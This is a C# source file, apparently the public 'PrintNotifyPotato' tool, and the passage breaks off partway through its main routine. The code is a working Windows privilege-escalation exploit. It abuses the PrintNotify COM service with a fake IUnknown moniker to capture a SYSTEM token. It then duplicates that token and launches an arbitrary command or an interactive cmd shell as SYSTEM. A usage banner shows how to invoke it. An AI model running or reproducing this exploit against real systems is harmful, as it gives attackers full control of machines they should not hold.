using System;
using System.IO;
using System.Runtime.ConstrainedExecution;
using System.Runtime.InteropServices;
using System.Runtime.InteropServices.ComTypes;
using System.Runtime.Versioning;
using System.Security;
using System.Security.Permissions;
using System.Security.Principal;
using System.Text;
using System.Threading;
using static PrintNotifyPotato.NativeMethods;

namespace PrintNotifyPotato
{
    public class NativeMethods
    {

        public static readonly uint HANDLE_FLAG_INHERIT = 0x00000001;
        public static readonly uint HANDLE_FLAG_PROTECT_FROM_CLOSE = 0x00000002;

        public readonly static uint STANDARD_RIGHTS_REQUIRED = 0x000F0000;
        public readonly static uint TOKEN_ASSIGN_PRIMARY = 0x0001;
        public readonly static uint TOKEN_DUPLICATE = 0x0002;
        public readonly static uint TOKEN_IMPERSONATE = 0x0004;
        public readonly static uint TOKEN_QUERY = 0x0008;
        public readonly static uint TOKEN_QUERY_SOURCE = 0x0010;
        public readonly static uint TOKEN_ADJUST_PRIVILEGES = 0x0020;
        public readonly static uint TOKEN_ADJUST_GROUPS = 0x0040;
        public readonly static uint TOKEN_ADJUST_DEFAULT = 0x0080;
        public readonly static uint TOKEN_ADJUST_SESSIONID = 0x0100;
        public readonly static uint TOKEN_ELEVATION = TOKEN_QUERY | TOKEN_ASSIGN_PRIMARY | TOKEN_DUPLICATE | TOKEN_IMPERSONATE | TOKEN_ADJUST_PRIVILEGES | TOKEN_ADJUST_DEFAULT | TOKEN_ADJUST_SESSIONID;

        public readonly static uint STARTF_FORCEONFEEDBACK = 0x00000040;
        public readonly static uint STARTF_FORCEOFFFEEDBACK = 0x00000080;
        public readonly static uint STARTF_PREVENTPINNING = 0x00002000;
        public readonly static uint STARTF_RUNFULLSCREEN = 0x00000020;
        public readonly static uint STARTF_TITLEISAPPID = 0x00001000;
        public readonly static uint STARTF_TITLEISLINKNAME = 0x00000800;
        public readonly static uint STARTF_UNTRUSTEDSOURCE = 0x00008000;
        public readonly static uint STARTF_USECOUNTCHARS = 0x00000008;
        public readonly static uint STARTF_USEFILLATTRIBUTE = 0x00000010;
        public readonly static uint STARTF_USEHOTKEY = 0x00000200;
        public readonly static uint STARTF_USEPOSITION = 0x00000004;
        public readonly static uint STARTF_USESHOWWINDOW = 0x00000001;
        public readonly static uint STARTF_USESIZE = 0x00000002;
        public readonly static uint STARTF_USESTDHANDLES = 0x00000100;


        public static readonly uint STATUS_SUCCESS = 0x00000000;
        public static readonly uint ERROR_SUCCESS = 0x00000000;

        public static readonly int SE_PRIVILEGE_ENABLED_BY_DEFAULT = 0x00000001;
        public static readonly int SE_PRIVILEGE_ENABLED = 0x00000002;
        public static readonly int SE_PRIVILEGE_REMOVED = 0X00000004;

        public readonly static int E_NOINTERFACE = unchecked((int)0x80004002);
        public readonly static int NOERROR = 0;

        public static Guid IUnknownGuid = new Guid("00000000-0000-0000-C000-000000000046");



        [Flags]
        public enum CLSCTX : uint
        {
            INPROC_SERVER = 0x1,
            INPROC_HANDLER = 0x2,
            LOCAL_SERVER = 0x4,
            INPROC_SERVER16 = 0x8,
            REMOTE_SERVER = 0x10,
            INPROC_HANDLER16 = 0x20,
            RESERVED1 = 0x40,
            RESERVED2 = 0x80,
            RESERVED3 = 0x100,
            RESERVED4 = 0x200,
            NO_CODE_DOWNLOAD = 0x400,
            RESERVED5 = 0x800,
            NO_CUSTOM_MARSHAL = 0x1000,
            ENABLE_CODE_DOWNLOAD = 0x2000,
            NO_FAILURE_LOG = 0x4000,
            DISABLE_AAA = 0x8000,
            ENABLE_AAA = 0x10000,
            FROM_DEFAULT_CONTEXT = 0x20000,
            ACTIVATE_32_BIT_SERVER = 0x40000,
            ACTIVATE_64_BIT_SERVER = 0x80000,
            ENABLE_CLOAKING = 0x100000,
            APPCONTAINER = 0x400000,
            ACTIVATE_AAA_AS_IU = 0x800000,
            ACTIVATE_NATIVE_SERVER = 0x1000000,
            ACTIVATE_ARM32_SERVER = 0x2000000,
            PS_DLL = 0x80000000,
            SERVER = INPROC_SERVER | LOCAL_SERVER | REMOTE_SERVER,
            ALL = INPROC_SERVER | INPROC_HANDLER | LOCAL_SERVER | REMOTE_SERVER
        }
        public enum EOLE_AUTHENTICATION_CAPABILITIES
        {
            EOAC_NONE = 0,
            EOAC_MUTUAL_AUTH = 0x1,
            EOAC_STATIC_CLOAKING = 0x20,
            EOAC_DYNAMIC_CLOAKING = 0x40,
            EOAC_ANY_AUTHORITY = 0x80,
            EOAC_MAKE_FULLSIC = 0x100,
            EOAC_DEFAULT = 0x800,
            EOAC_SECURE_REFS = 0x2,
            EOAC_ACCESS_CONTROL = 0x4,
            EOAC_APPID = 0x8,
            EOAC_DYNAMIC = 0x10,
            EOAC_REQUIRE_FULLSIC = 0x200,
            EOAC_AUTO_IMPERSONATE = 0x400,
            EOAC_NO_CUSTOM_MARSHAL = 0x2000,
            EOAC_DISABLE_AAA = 0x1000
        }
        public enum AuthnLevel
        {
            RPC_C_AUTHN_LEVEL_DEFAULT = 0,
            RPC_C_AUTHN_LEVEL_NONE = 1,
            RPC_C_AUTHN_LEVEL_CONNECT = 2,
            RPC_C_AUTHN_LEVEL_CALL = 3,
            RPC_C_AUTHN_LEVEL_PKT = 4,
            RPC_C_AUTHN_LEVEL_PKT_INTEGRITY = 5,
            RPC_C_AUTHN_LEVEL_PKT_PRIVACY = 6
        }
        public enum ImpLevel
        {
            RPC_C_IMP_LEVEL_DEFAULT = 0,
            RPC_C_IMP_LEVEL_ANONYMOUS = 1,
            RPC_C_IMP_LEVEL_IDENTIFY = 2,
            RPC_C_IMP_LEVEL_IMPERSONATE = 3,
            RPC_C_IMP_LEVEL_DELEGATE = 4,
        }
        public enum TOKEN_TYPE
        {
            UnKnown = -1,
            TokenPrimary = 1,
            TokenImpersonation
        }
        [Flags]
        public enum ProcessCreateFlags : uint
        {
            DEBUG_PROCESS = 0x00000001,
            DEBUG_ONLY_THIS_PROCESS = 0x00000002,
            CREATE_SUSPENDED = 0x00000004,
            DETACHED_PROCESS = 0x00000008,
            CREATE_NEW_CONSOLE = 0x00000010,
            NORMAL_PRIORITY_CLASS = 0x00000020,
            IDLE_PRIORITY_CLASS = 0x00000040,
            HIGH_PRIORITY_CLASS = 0x00000080,
            REALTIME_PRIORITY_CLASS = 0x00000100,
            CREATE_NEW_PROCESS_GROUP = 0x00000200,
            CREATE_UNICODE_ENVIRONMENT = 0x00000400,
            CREATE_SEPARATE_WOW_VDM = 0x00000800,
            CREATE_SHARED_WOW_VDM = 0x00001000,
            CREATE_FORCEDOS = 0x00002000,
            BELOW_NORMAL_PRIORITY_CLASS = 0x00004000,
            ABOVE_NORMAL_PRIORITY_CLASS = 0x00008000,
            INHERIT_PARENT_AFFINITY = 0x00010000,
            INHERIT_CALLER_PRIORITY = 0x00020000,
            CREATE_PROTECTED_PROCESS = 0x00040000,
            EXTENDED_STARTUPINFO_PRESENT = 0x00080000,
            PROCESS_MODE_BACKGROUND_BEGIN = 0x00100000,
            PROCESS_MODE_BACKGROUND_END = 0x00200000,
            CREATE_BREAKAWAY_FROM_JOB = 0x01000000,
            CREATE_PRESERVE_CODE_AUTHZ_LEVEL = 0x02000000,
            CREATE_DEFAULT_ERROR_MODE = 0x04000000,
            CREATE_NO_WINDOW = 0x08000000,
            PROFILE_USER = 0x10000000,
            PROFILE_KERNEL = 0x20000000,
            PROFILE_SERVER = 0x40000000,
            CREATE_IGNORE_SYSTEM_DEFAULT = 0x80000000,
        }

        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
        public struct STARTUPINFO
        {
            public Int32 cb;
            public string lpReserved;
            public string lpDesktop;
            public string lpTitle;
            public Int32 dwX;
            public Int32 dwY;
            public Int32 dwXSize;
            public Int32 dwYSize;
            public Int32 dwXCountChars;
            public Int32 dwYCountChars;
            public Int32 dwFillAttribute;
            public Int32 dwFlags;
            public Int16 wShowWindow;
            public Int16 cbReserved2;
            public IntPtr lpReserved2;
            public IntPtr hStdInput;
            public IntPtr hStdOutput;
            public IntPtr hStdError;
        }
        [StructLayout(LayoutKind.Sequential)]
        public struct SECURITY_ATTRIBUTES
        {
            public int nLength;
            public IntPtr pSecurityDescriptor;
            public bool bInheritHandle;
        }
        [StructLayout(LayoutKind.Sequential)]
        public struct PROCESS_INFORMATION
        {
            public IntPtr hProcess;
            public IntPtr hThread;
            public int dwProcessId;
            public int dwThreadId;
        }
        public enum SECURITY_IMPERSONATION_LEVEL
        {
            SecurityAnonymous,
            SecurityIdentification,
            SecurityImpersonation,
            SecurityDelegation
        }
        [StructLayout(LayoutKind.Sequential)]
        public class TokenPrivileges
        {
            public int PrivilegeCount = 1;

            public LUID Luid;

            public int Attributes;
        }
        [StructLayout(LayoutKind.Sequential)]
        public struct LUID
        {
            public int LowPart;

            public int HighPart;
        }



        [DllImport("Ole32", ExactSpelling = true)]
        public static extern int CoImpersonateClient();
        [DllImport("Ole32", ExactSpelling = true)]
        public static extern int CoRevertToSelf();

        [DllImport("ole32.dll")]
        public static extern int CoCreateInstance(ref Guid rclsid, IntPtr pUnkOuter, CLSCTX dwClsContext, ref Guid riid, out IntPtr ppv);

        [DllImport("ole32.dll", EntryPoint = "CreatePointerMoniker", CallingConvention = CallingConvention.StdCall)]
        public static extern int CreatePointerMoniker(IntPtr punk, ref IntPtr ppmk);

        [DllImport("ole32.dll")]
        public static extern int CoInitializeSecurity(
            IntPtr pSecDesc,
            int cAuthSvc,
            IntPtr asAuthSvc,
            IntPtr pReserved1,
            AuthnLevel dwAuthnLevel,
            ImpLevel dwImpLevel,
            IntPtr pAuthList,
            EOLE_AUTHENTICATION_CAPABILITIES dwCapabilities,
            IntPtr pReserved3
            );

        [DllImport("advapi32", CharSet = CharSet.Auto, SetLastError = true)]
        internal static extern bool OpenThreadToken(
       [In] IntPtr threadHandle,
       [In] TokenAccessLevels desiredAccess,
       [In] bool openAsSelf,
       [Out] out IntPtr tokenHandle
       );

        [DllImport("advapi32", CharSet = CharSet.Auto, SetLastError = true)]
        public static extern bool ImpersonateSelf([In] SECURITY_IMPERSONATION_LEVEL desiredAccess);
        [DllImport("kernel32", CallingConvention = CallingConvention.Cdecl)]
        public static extern IntPtr GetCurrentThread();

        [DllImport("advapi32", CharSet = CharSet.Auto, SetLastError = true)]
        public extern static bool DuplicateTokenEx(IntPtr hExistingToken, uint dwDesiredAccess, IntPtr lpTokenAttributes, SECURITY_IMPERSONATION_LEVEL ImpersonationLevel, TOKEN_TYPE TokenType, out IntPtr phNewToken);
        [DllImport("kernel32")]
        public static extern void CloseHandle(IntPtr hObject);
        [DllImport("advapi32", BestFitMapping = false, CharSet = CharSet.Auto, SetLastError = true)]
        public static extern bool LookupPrivilegeValue([MarshalAs(UnmanagedType.LPTStr)] string lpSystemName, [MarshalAs(UnmanagedType.LPTStr)] string lpName, out LUID lpLuid);
        [DllImport("advapi32", CharSet = CharSet.Auto, SetLastError = true)]
        public static extern bool AdjustTokenPrivileges(IntPtr TokenHandle, bool DisableAllPrivileges, TokenPrivileges NewState, int BufferLength, IntPtr PreviousState, out int ReturnLength);
        [DllImport("advapi32", SetLastError = true, CharSet = CharSet.Unicode)]
        public static extern bool CreateProcessAsUserW(IntPtr hToken, string lpApplicationName, string lpCommandLine, IntPtr lpProcessAttributes, IntPtr lpThreadAttributes, bool bInheritHandles, uint dwCreationFlags, IntPtr lpEnvironment, [MarshalAs(UnmanagedType.LPWStr)] string lpCurrentDirectory, ref STARTUPINFO lpStartupInfo, out PROCESS_INFORMATION lpProcessInformation);
        [DllImport("advapi32", SetLastError = true, CharSet = CharSet.Unicode)]
        public static extern bool CreateProcessWithTokenW(IntPtr hToken, uint dwLogonFlags, string lpApplicationName, string lpCommandLine, uint dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory, [In] ref STARTUPINFO lpStartupInfo, out PROCESS_INFORMATION lpProcessInformation);
        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern bool PeekNamedPipe(IntPtr handle, byte[] buffer, uint nBufferSize, ref uint bytesRead, ref uint bytesAvail, ref uint BytesLeftThisMessage);
        [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        public static extern bool CreatePipe(out IntPtr hReadPipe, out IntPtr hWritePipe, ref SECURITY_ATTRIBUTES lpPipeAttributes, int nSize);
        [DllImport("Kernel32", SetLastError = true)]
        public static extern bool SetHandleInformation(IntPtr TokenHandle, uint dwMask, uint dwFlags);

        public static bool TryAddTokenPriv(IntPtr token, string privName)
        {
            TokenPrivileges tokenPrivileges = new TokenPrivileges();
            if (LookupPrivilegeValue(null, privName, out tokenPrivileges.Luid))
            {

                tokenPrivileges.PrivilegeCount = 1;
                tokenPrivileges.Attributes = SE_PRIVILEGE_ENABLED;
                int ReturnLength = 0;
                AdjustTokenPrivileges(token, false, tokenPrivileges, 0, IntPtr.Zero, out ReturnLength);
                if (Marshal.GetLastWin32Error() == ERROR_SUCCESS)
                {
                    return true;
                }
            }
            return false;
        }
    }
    public class FakeIUnknown
    {
        private IntPtr moniker;
        private IntPtr fakeIUnknownPtr;
        private IntPtr fakeIUnknownVtblPtr;

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        private delegate int QueryInterface(IntPtr thisPtr, [In, MarshalAs(UnmanagedType.LPStruct)] Guid iid, out IntPtr ppv);
        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        private delegate uint AddRef(IntPtr thisPtr);
        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        private delegate uint Release(IntPtr thisPtr);
        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        private delegate void Fuck();

        private static QueryInterface QueryInterfaceFunc;
        private static AddRef AddRefFunc;
        private static Release ReleaseFunc;
        private static WindowsIdentity systemIdentity;

        static FakeIUnknown()
        {
            QueryInterfaceFunc = QueryInterfaceImpl;
            AddRefFunc = AddRefImpl;
            ReleaseFunc = ReleaseImpl;
        }

        public FakeIUnknown()
        {
            moniker = IntPtr.Zero;



            fakeIUnknownPtr = Marshal.AllocHGlobal(IntPtr.Size * 2);
            fakeIUnknownVtblPtr = Marshal.AllocHGlobal(IntPtr.Size * 3);

            Marshal.WriteIntPtr(fakeIUnknownPtr, fakeIUnknownVtblPtr);


            Marshal.WriteIntPtr(fakeIUnknownVtblPtr, Marshal.GetFunctionPointerForDelegate(QueryInterfaceFunc));
            Marshal.WriteIntPtr(new IntPtr(fakeIUnknownVtblPtr.ToInt64() + IntPtr.Size * 1), Marshal.GetFunctionPointerForDelegate(AddRefFunc));
            Marshal.WriteIntPtr(new IntPtr(fakeIUnknownVtblPtr.ToInt64() + IntPtr.Size * 2), Marshal.GetFunctionPointerForDelegate(ReleaseFunc));


        }

        public IntPtr GetIUnknown()
        {
            return fakeIUnknownPtr;
        }

        public WindowsIdentity GetSystemIdentity()
        {
            return systemIdentity;
        }

        public IntPtr CreatePointerMoniker()
        {
            if (moniker == IntPtr.Zero)
            {
                int hr = NativeMethods.CreatePointerMoniker(fakeIUnknownPtr, ref moniker);
                if (hr != NativeMethods.NOERROR)
                {
                    throw new COMException("CreatePointerMoniker Fail hr = " + hr);
                }
            }
            return moniker;
        }

        ~FakeIUnknown()
        {
            Marshal.Release(moniker);
            Marshal.FreeHGlobal(fakeIUnknownVtblPtr);
            Marshal.FreeHGlobal(fakeIUnknownPtr);
        }






        private static int QueryInterfaceImpl(IntPtr thisPtr, [In, MarshalAs(UnmanagedType.LPStruct)] Guid iid, out IntPtr ppv)
        {
            TryTakeToken();

            if (iid == NativeMethods.IUnknownGuid)
            {
                ppv = thisPtr;
            }
            else
            {
                ppv = IntPtr.Zero;
                return NativeMethods.E_NOINTERFACE;
            }
            return NativeMethods.NOERROR;
        }
        private static uint AddRefImpl(IntPtr thisPtr)
        {
            TryTakeToken();
            return 1;
        }
        private static uint ReleaseImpl(IntPtr thisPtr)
        {
            TryTakeToken();

            return 1;
        }

        private static void TryTakeToken()
        {
            if (systemIdentity == null && NativeMethods.CoImpersonateClient() == 0)
            {
                WindowsIdentity tempWindowsIdentity = WindowsIdentity.GetCurrent();
                if (tempWindowsIdentity.IsSystem && tempWindowsIdentity.ImpersonationLevel >= TokenImpersonationLevel.Impersonation)
                {
                    systemIdentity = tempWindowsIdentity;
                }
                else
                {
                    tempWindowsIdentity.Dispose();
                }
                NativeMethods.CoRevertToSelf();
            }
        }

    }

    public class Program
    {
        public static bool CreateProcess(IntPtr tokenHandle, string commandLine, bool bInheritHandles, uint dwCreationFlags, ref STARTUPINFO startupinfo, out PROCESS_INFORMATION processInformation)
        {

            if (CreateProcessAsUserW(tokenHandle, null, commandLine, IntPtr.Zero, IntPtr.Zero, bInheritHandles, dwCreationFlags
        , IntPtr.Zero, null, ref startupinfo, out processInformation))
            {
                return true;
            }

            //need TOKEN_ASSIGN_PRIMARY | TOKEN_DUPLICATE | TOKEN_QUERY | TOKEN_ADJUST_DEFAULT | TOKEN_ADJUST_SESSIONID
            if (CreateProcessWithTokenW(tokenHandle, 0, null, commandLine, dwCreationFlags, IntPtr.Zero, null, ref startupinfo,
                out processInformation))
            {
                return true;
            }
            return false;

        }
        public static void createProcessReadOut(TextWriter consoleWriter, IntPtr tokenHandle, string commandLine)
        {
            IntPtr childProcessStdOutRead = IntPtr.Zero;
            IntPtr childProcessStdOutWrite = IntPtr.Zero;

            FileStream childProcessReadStream = null;

            PROCESS_INFORMATION processInformation = new PROCESS_INFORMATION();

            //初始化安全属性
            SECURITY_ATTRIBUTES securityAttributes = new SECURITY_ATTRIBUTES();

            securityAttributes.nLength = Marshal.SizeOf(typeof(SECURITY_ATTRIBUTES));
            securityAttributes.pSecurityDescriptor = IntPtr.Zero;
            securityAttributes.bInheritHandle = true;

            //初始化子进程输出

            if (!CreatePipe(out childProcessStdOutRead, out childProcessStdOutWrite,
                    ref securityAttributes, 8196))
            {
                goto end;
            }


            STARTUPINFO startupInfo = new STARTUPINFO();
            startupInfo.cb = Marshal.SizeOf(typeof(STARTUPINFO));
            startupInfo.hStdError = childProcessStdOutWrite;
            startupInfo.hStdOutput = childProcessStdOutWrite;
            startupInfo.hStdInput = IntPtr.Zero;
            startupInfo.dwFlags = (int)STARTF_USESTDHANDLES;

            SetHandleInformation(childProcessStdOutRead, HANDLE_FLAG_INHERIT, HANDLE_FLAG_INHERIT);
            SetHandleInformation(childProcessStdOutWrite, HANDLE_FLAG_INHERIT, HANDLE_FLAG_INHERIT);



            if (CreateProcess(tokenHandle, commandLine, true, (uint)ProcessCreateFlags.CREATE_NO_WINDOW, ref startupInfo,
                    out processInformation))
            {
                consoleWriter.WriteLine($"[*] process start with pid {processInformation.dwProcessId}");

                CloseHandle(childProcessStdOutWrite);
                childProcessStdOutWrite = IntPtr.Zero;

                childProcessReadStream = new FileStream(childProcessStdOutRead, FileAccess.Read, false);

                byte[] readBytes = new byte[4096];
                uint bytesAvail = 0;
                uint BytesLeftThisMessage = 0;
                uint bytesRead = 0;
                int read = 0;

                while (true)
                {
                    if (!PeekNamedPipe(childProcessStdOutRead, readBytes, (uint)readBytes.Length,
                        ref bytesRead, ref bytesAvail, ref BytesLeftThisMessage))
                    {
                        break;
                    }

                    if (bytesAvail > 0)
                    {
                        read = childProcessReadStream.Read(readBytes, 0, readBytes.Length);
                        consoleWriter.Write(Encoding.Default.GetChars(readBytes, 0, read));
                    }

                }


            }
            else
            {
                consoleWriter.WriteLine($"[!] Cannot create process Win32Error:{Marshal.GetLastWin32Error()}");
            }
        end:
            if (childProcessReadStream != null)
            {
                childProcessReadStream.Close();
            }
            if (processInformation.hProcess != IntPtr.Zero)
            {
                CloseHandle(processInformation.hProcess);
            }
            if (processInformation.hThread != IntPtr.Zero)
            {
                CloseHandle(processInformation.hThread);
            }
            if (childProcessStdOutRead != IntPtr.Zero)
            {
                CloseHandle(childProcessStdOutRead);
            }
            if (childProcessStdOutWrite != IntPtr.Zero)
            {
                CloseHandle(childProcessStdOutWrite);
            }
        }
        public static void createProcessInteractive(IntPtr tokenHandle, string commandLine)
        {
            IntPtr childProcessStdInRead = IntPtr.Zero;
            IntPtr childProcessStdInWrite = IntPtr.Zero;
            IntPtr childProcessStdOutRead = IntPtr.Zero;
            IntPtr childProcessStdOutWrite = IntPtr.Zero;

            Thread proxyStdInThread = null;

            FileStream childProcessReadStream = null;
            FileStream childProcessWriteStream = null;

            PROCESS_INFORMATION processInformation = new PROCESS_INFORMATION();

            //初始化安全属性
            SECURITY_ATTRIBUTES securityAttributes = new SECURITY_ATTRIBUTES();

            securityAttributes.nLength = Marshal.SizeOf(typeof(SECURITY_ATTRIBUTES));
            securityAttributes.pSecurityDescriptor = IntPtr.Zero;
            securityAttributes.bInheritHandle = true;

            //初始化子进程输入输出
            if (!CreatePipe(out childProcessStdInRead, out childProcessStdInWrite,
                    ref securityAttributes, 8196))
            {
                goto end;
            }

            if (!CreatePipe(out childProcessStdOutRead, out childProcessStdOutWrite,
                    ref securityAttributes, 8196))
            {
                goto end;
            }


            STARTUPINFO startupInfo = new STARTUPINFO();
            startupInfo.cb = Marshal.SizeOf(typeof(STARTUPINFO));
            startupInfo.hStdError = childProcessStdOutWrite;
            startupInfo.hStdOutput = childProcessStdOutWrite;
            startupInfo.hStdInput = childProcessStdInRead;
            startupInfo.dwFlags = (int)STARTF_USESTDHANDLES;

            SetHandleInformation(childProcessStdInRead, HANDLE_FLAG_INHERIT, HANDLE_FLAG_INHERIT);
            SetHandleInformation(childProcessStdInWrite, HANDLE_FLAG_INHERIT, HANDLE_FLAG_INHERIT);
            SetHandleInformation(childProcessStdOutRead, HANDLE_FLAG_INHERIT, HANDLE_FLAG_INHERIT);
            SetHandleInformation(childProcessStdOutWrite, HANDLE_FLAG_INHERIT, HANDLE_FLAG_INHERIT);



            if (CreateProcess(tokenHandle, commandLine, true, (uint)ProcessCreateFlags.CREATE_NO_WINDOW, ref startupInfo,
                    out processInformation))
            {
                Console.WriteLine($"[*] process start with pid {processInformation.dwProcessId}");

                CloseHandle(childProcessStdInRead);
                childProcessStdInRead = IntPtr.Zero;
                CloseHandle(childProcessStdOutWrite);
                childProcessStdOutWrite = IntPtr.Zero;

                childProcessReadStream = new FileStream(childProcessStdOutRead, FileAccess.Read, false);
                childProcessWriteStream = new FileStream(childProcessStdInWrite, FileAccess.Write, false);

                byte[] readBytes = new byte[4096];
                uint bytesAvail = 0;
                uint BytesLeftThisMessage = 0;
                uint bytesRead = 0;
                int read = 0;



                proxyStdInThread = new Thread(() =>
                {
                    Stream stdIn = Console.OpenStandardInput();
                    byte[] readBytes2 = new byte[1024];
                    int read2 = 0;
                    try
                    {
                        while (true)
                        {
                            if ((read2 = stdIn.Read(readBytes2, 0, readBytes2.Length)) > 0)
                            {
                                childProcessWriteStream.Write(readBytes2, 0, read2);
                                childProcessWriteStream.Flush();
                            }
                        }
                    }
                    catch (Exception e)
                    {

                    }
                });

                proxyStdInThread.IsBackground = true;
                proxyStdInThread.Start();

                while (true)
                {
                    if (!PeekNamedPipe(childProcessStdOutRead, readBytes, (uint)readBytes.Length,
                        ref bytesRead, ref bytesAvail, ref BytesLeftThisMessage))
                    {
                        break;
                    }

                    if (bytesAvail > 0)
                    {
                        read = childProcessReadStream.Read(readBytes, 0, readBytes.Length);
                        Console.Write(Encoding.Default.GetChars(readBytes, 0, read));
                    }

                }


            }
            else
            {
                Console.WriteLine($"[-] Cannot create process Win32Error:{Marshal.GetLastWin32Error()}");
            }

        end:
            if (proxyStdInThread != null)
            {
                if (proxyStdInThread.IsAlive)
                {
                    proxyStdInThread.Abort();

                }
            }
            if (childProcessReadStream != null)
            {
                childProcessReadStream.Close();
            }
            if (childProcessWriteStream != null)
            {
                childProcessWriteStream.Close();
            }
            if (processInformation.hProcess != IntPtr.Zero)
            {
                CloseHandle(processInformation.hProcess);
            }
            if (processInformation.hThread != IntPtr.Zero)
            {
                CloseHandle(processInformation.hThread);
            }
            if (childProcessStdInRead != IntPtr.Zero)
            {
                CloseHandle(childProcessStdInRead);
            }
            if (childProcessStdInWrite != IntPtr.Zero)
            {
                CloseHandle(childProcessStdInWrite);
            }
            if (childProcessStdOutRead != IntPtr.Zero)
            {
                CloseHandle(childProcessStdOutRead);
            }
            if (childProcessStdOutWrite != IntPtr.Zero)
            {
                CloseHandle(childProcessStdOutWrite);
            }
        }
        public static IntPtr GetThreadToken()
        {
            IntPtr token;
            IntPtr currentThread = NativeMethods.GetCurrentThread();
            if (!OpenThreadToken(currentThread, TokenAccessLevels.AllAccess, true, out token))
            {
                if (ImpersonateSelf(SECURITY_IMPERSONATION_LEVEL.SecurityImpersonation))
                {
                    if (!OpenThreadToken(currentThread, TokenAccessLevels.AllAccess, true, out token))
                    {
                        return IntPtr.Zero;
                    }
                }
                else
                {
                    return IntPtr.Zero;
                }
            }
            return token;
        }

        static void Main(string[] args)
        {
            string commandLine = "";
            bool isInteractive = false;
            if (args.Length >= 1 && args[0] != "-h" && args[0] != "?")
            {
                commandLine = args[0];
                if (args.Length >= 2)
                {
                    isInteractive = args[1].ToLower().Equals("interactive");
                }
            }
            else
            {
                Console.WriteLine(@"
 aaaa    aaa                           aaa         
 aaaa    aaa                           aaa         
 aaaa    aaa                           aaa         
 aaaa    aaa                           aaa         
 aaaa    aaa                           aaa         
 aaaa    aaa                           aaa         
 aaaa    aaa    aaaaaaa     aaaaaaa    aaa   aaaa  
 aaaaaaaaaaa   aaaaaaaaa   aaaaaaaaa   aaa  aaaa   
 aaaaaaaaaaa  aaaa   aaa  aaaa   aaaa  aaa aaaa    
 aaaa    aaa         aaa  aaaa   aaaa  aaaaaaa     
 aaaa    aaa     aaaaaaa  aaa          aaaaaaa     
 aaaa    aaa   aaaaaaaaa  aaa          aaaaaaaa    
 aaaa    aaa  aaaa   aaa  aaa     aaa  aaaa aaa    
 aaaa    aaa  aaa   aaaa  aaaa   aaaa  aaa  aaaa   
 aaaa    aaa  aaa  aaaaa   aaaa  aaaa  aaa   aaaa  
 aaaa    aaa  aaaaaaaaaa    aaaaaaaa   aaa    aaa  
 aaaa    aaa    aaaa aaaa    aaaaa     aaa    aaaa 

Github: https://github.com/BeichenDream/PrintNotifyPotato

Example:
            PrintNotifyPotato.exe whoami
            PrintNotifyPotato.exe cmd interactive

");
                return;
            }


            IntPtr defaultToken = GetThreadToken();
            if (defaultToken != IntPtr.Zero)
            {
                TryAddTokenPriv(defaultToken, "SeImpersonatePrivilege");
                TryAddTokenPriv(defaultToken, "SeAssignPrimaryTokenPrivilege");
                CloseHandle(defaultToken);
            }

            try
            {

                Guid PrintNotifyGUID = new Guid("854A20FB-2D44-457D-992F-EF13785D2B51");


                int hr = NativeMethods.CoInitializeSecurity(IntPtr.Zero, -1, IntPtr.Zero, IntPtr.Zero, NativeMethods.AuthnLevel.RPC_C_AUTHN_LEVEL_CONNECT, NativeMethods.ImpLevel.RPC_C_IMP_LEVEL_IMPERSONATE, IntPtr.Zero, NativeMethods.EOLE_AUTHENTICATION_CAPABILITIES.EOAC_DYNAMIC_CLOAKING, IntPtr.Zero);
                if (hr != NativeMethods.NOERROR)
                {
                    Console.WriteLine($"[!] Cannot CoInitializeSecurity hr = {hr}");
                }


                IntPtr printNotify;
                hr = NativeMethods.CoCreateInstance(ref PrintNotifyGUID, IntPtr.Zero, NativeMethods.CLSCTX.LOCAL_SERVER, ref NativeMethods.IUnknownGuid, out printNotify);
                if (hr == NativeMethods.NOERROR)
                {
                    Console.WriteLine($"[*] Create PrintNotify Success!");

                    IntPtr IConnectionPointContainerPtr;
                    Guid IConnectionPointContainerGuid = typeof(IConnectionPointContainer).GUID;
                    hr = Marshal.QueryInterface(printNotify, ref IConnectionPointContainerGuid, out IConnectionPointContainerPtr);
                    if (hr == 0)
                    {
                        IConnectionPointContainer connectionPointContainer = (IConnectionPointContainer)Marshal.GetTypedObjectForIUnknown(IConnectionPointContainerPtr, typeof(IConnectionPointContainer));
                        IEnumConnectionPoints enumConnectionPoints;
                        connectionPointContainer.EnumConnectionPoints(out enumConnectionPoints);

                        IConnectionPoint[] connectionPoint = new IConnectionPoint[1];

                        IntPtr pceltFetched = Marshal.AllocHGlobal(sizeof(int));
                        enumConnectionPoints.Next(1, connectionPoint, pceltFetched);
                        if (Marshal.ReadInt32(pceltFetched) >= 1)
                        {
                            int cookie = 0;
                            try
                            {
                                FakeIUnknown fakeIUnknown = new FakeIUnknown();
                                Console.WriteLine($"[*] Create FakeIUnknown Success!");
                                IntPtr moniker = fakeIUnknown.CreatePointerMoniker();

                                Console.WriteLine($"[*] CreatePointerMoniker Success!");

                                try
                                {
                                    Console.WriteLine($"[*] Trigger......");
                                    connectionPoint[0].Advise(Marshal.GetObjectForIUnknown(moniker), out cookie);
                                    connectionPoint[0].Unadvise(cookie);
                                }
                                catch (Exception)
                                {

                                }
                                WindowsIdentity systemIdentity = fakeIUnknown.GetSystemIdentity();
                                if (systemIdentity != null)
                                {
                                    Console.WriteLine("[*] Got Token: 0x{0:x}", systemIdentity.Token.ToInt64());
                                    Console.WriteLine($"[*] CurrentUser: {systemIdentity.Name}");

                                    IntPtr primaryToken;
                                    if (DuplicateTokenEx(systemIdentity.Token, NativeMethods.TOKEN_ELEVATION, IntPtr.Zero, SECURITY_IMPERSONATION_LEVEL.SecurityImpersonation, TOKEN_TYPE.TokenPrimary, out primaryToken))
                                    {
                                        Console.WriteLine("[*] DuplicateTokenEx Success! PrimaryToken: 0x{0:x}", primaryToken);

                                        if (isInteractive)
                                        {
                                            createProcessInteractive(primaryToken, commandLine);
                                        }
                                        else
                                        {
                                            createProcessReadOut(Console.Out, primaryToken, commandLine);
                                        }

                                        CloseHandle(primaryToken);


                                    }
                                    else
                                    {
                                        Console.WriteLine("[!] No token is alive");
                                    }
                                    systemIdentity.Dispose();

                                }
                                else
                                {
                                    Console.WriteLine($"[!] No token is alive");
                                }


